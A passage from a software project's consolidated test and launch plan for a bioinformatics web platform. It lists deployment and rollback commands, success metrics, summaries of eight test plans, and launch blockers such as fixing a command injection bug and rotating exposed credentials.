- [ ] Verify backups running
- [ ] Check security alerts

---

## Deployment Commands

**Frontend Deployment:**
```bash
cd /home/yzhang/biomate/frontend
npm run build
pm2 start npm --name "biomate-frontend" -- start
pm2 save
pm2 startup
```

**Galaxy Backend:**
```bash
cd /home/yzhang/biomate/backend
source .venv/bin/activate
export SKIP_CLIENT_BUILD=1
export GALAXY_CONFIG_FILE=config/galaxy.yml
export PYTHONPATH=lib

gunicorn 'galaxy.webapps.galaxy.fast_factory:factory()' \
  --timeout 300 \
  --pythonpath lib \
  -k galaxy.webapps.galaxy.workers.Worker \
  -b 0.0.0.0:8081 \
  --workers=4 \
  --preload \
  --daemon \
  --pid galaxy.pid \
  --access-logfile /var/log/galaxy/access.log \
  --error-logfile /var/log/galaxy/error.log
```

---

## Rollback Procedure

**If Critical Issue Found:**
```bash
# 1. Mark current version as unhealthy
aws elbv2 mark-unhealthy ...

# 2. Deploy previous version
kubectl rollout undo deployment/biomate-web

# 3. Verify rollback
curl https://biomate.com/api/health

# 4. Monitor error rates
# 5. Fix issue in development
# 6. Re-deploy when ready
```

---

## Success Metrics

**Technical Metrics:**
- Uptime: > 99.9%
- API latency (p95): < 500ms
- Error rate: < 0.1%
- Database query time (p95): < 100ms

**Business Metrics:**
- User registrations per day
- Trial-to-paid conversion rate
- Workflow execution success rate
- User retention rate
- Monthly recurring revenue (MRR)

---

**END OF CONSOLIDATED TEST PLANS**

---

## Summary of All 8 Test Plans

**Test Plan 1: Landing Performance** ✓ Created (separate file)
- Performance optimization
- Mobile responsiveness
- SEO optimization
- Accessibility (WCAG 2.1 AA)

**Test Plan 2: Registration & Payment** ✓ Created (separate file)
- Financial credential collection (CRITICAL REQUIREMENT)
- Stripe integration
- Email verification
- Security testing

**Test Plan 3: Login & Session** ✓ Consolidated above
- Redis configuration (BLOCKER)
- OAuth setup
- Session management
- Security measures

**Test Plan 4: Platform Dashboard** ✓ Consolidated above
- Fix empty home.tsx (BLOCKER)
- Main interface implementation
- Navigation and routing
- User experience

**Test Plan 5: Workflow Execution** ✓ Consolidated above
- Fix command injection vulnerability (CRITICAL)
- End-to-end workflow testing
- Real-time monitoring
- Pause/resume functionality

**Test Plan 6: Output & Results** ✓ Consolidated above
- Results display and download
- File streaming
- Preview and sharing
- Export options

**Test Plan 7: Security Audit** ✓ Consolidated above
- Fix exposed credentials (CRITICAL)
- Implement CSRF protection
- Security headers
- Penetration testing

**Test Plan 8: Infrastructure & Deployment** ✓ Consolidated above
- Production environment setup
- Redis, Email, SSL configuration
- Monitoring and alerting
- Disaster recovery

---

## Critical Launch Blockers Summary

### P0 - MUST FIX BEFORE LAUNCH:
1. 🔴 **Implement financial credential collection during registration**
2. 🔴 **Configure Stripe fully (all env vars, webhooks)**
3. 🔴 **Rotate and secure ALL exposed credentials**
4. 🔴 **Fix command injection vulnerability in tool installer**
5. 🔴 **Implement main platform interface (home.tsx is 75 bytes)**
6. 🔴 **Configure Redis for session management**
7. 🔴 **Implement CSRF protection**
8. 🔴 **Configure email service (registration, password reset, notifications)**
9. 🔴 **Add backend password validation**
10. 🔴 **Implement security headers**

### Estimated Timeline:
**6-8 weeks minimum** to address all critical issues and complete testing before launch.

---

**Document Status:** COMPLETE
**Total Pages:** ~100+ pages across all plans
**Ready for:** Implementation and testing phase
